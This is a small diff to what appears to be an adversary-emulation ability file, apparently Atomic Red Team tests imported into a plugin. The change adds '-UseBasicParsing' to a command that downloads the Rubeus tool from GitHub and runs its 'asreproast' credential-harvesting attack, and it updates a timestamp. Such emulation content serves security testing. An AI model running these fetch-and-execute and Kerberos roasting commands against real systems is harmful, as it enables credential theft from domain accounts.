@@ -16,8 +16,9 @@
           must be done manually; fi; if(Test-Path -Path "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe")
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction Ignore -Force | Out-Null; Invoke-Webrequest -Uri https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
-          -OutFile PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe; fi; cmd.exe
-          /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asreproast /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"'
+          -OutFile PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe -UseBasicParsing;
+          fi; cmd.exe /c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asreproast
+          /outfile:"PathToAtomicsFolder\..\ExternalPayloads\rubeus_output.txt"'
         cleanup: Remove-Item "#{local_folder}\#{out_file}" -ErrorAction Ignore
         elevation_required: false
   plugin: atomic
@@ -71,8 +72,9 @@
         -ErrorAction Ignore -Force | Out-Null
 
         Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+        -UseBasicParsing
 
         '
     technique_created: '2020-08-24T13:43:00.028Z'
     atomic_guid: 615bd568-2859-41b5-9aed-61f6a88e48dd
-    import_timestamp: '2026-10-20T07:08:30.117212Z'
+    import_timestamp: '2026-10-21T07:01:52.054624Z'
